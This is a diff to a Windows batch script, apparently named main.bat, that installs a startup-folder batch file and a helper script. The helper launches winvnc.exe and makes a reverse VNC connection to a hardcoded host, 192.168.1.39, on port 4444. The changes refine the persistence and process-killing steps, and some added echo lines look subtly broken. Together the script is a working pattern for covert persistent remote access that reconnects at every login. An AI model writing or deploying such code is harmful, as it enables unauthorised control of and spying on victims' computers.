@@ -8,15 +8,19 @@ REM Create the batch file for startup folder (startup_winvnc.bat)
   echo @echo off
   echo timeout /t 3 >nul  REM Wait 3 seconds for computer startup
   echo cd /d "%~dp0"
-  call "C:\Client-Load-main\run_winvnc.bat"
+  echo call "%~dp0run_winvnc.bat"
 ) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat"
 
 REM Create the batch file to run winvnc.exe (run_winvnc.bat)
 (
   echo @echo off
-  echo timeout /t 1 >nul
-  echo taskkill /im winvnc.exe /f
-  echo timeout /t 1 >nul
+  echo tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
+  echo if errorlevel 1 (
+  echo     echo No existing winvnc.exe process found.
+  echo ) else (
+  echo     taskkill /im winvnc.exe /f
+  echo     timeout /t 1 >nul
+  echo )
   echo start winvnc.exe -run
   echo timeout /t 1 >nul
   echo winvnc.exe -connect 192.168.1.39::4444
@@ -46,7 +50,7 @@ REM Wait for 7 seconds to allow the user to grant permissions
 timeout /t 7 >nul
 
 REM Run the run_winvnc.bat script
-echo timeout /t 1 >nul
+timeout /t 1 >nul
 call "%script_dir%run_winvnc.bat"
 
 REM End of main.bat
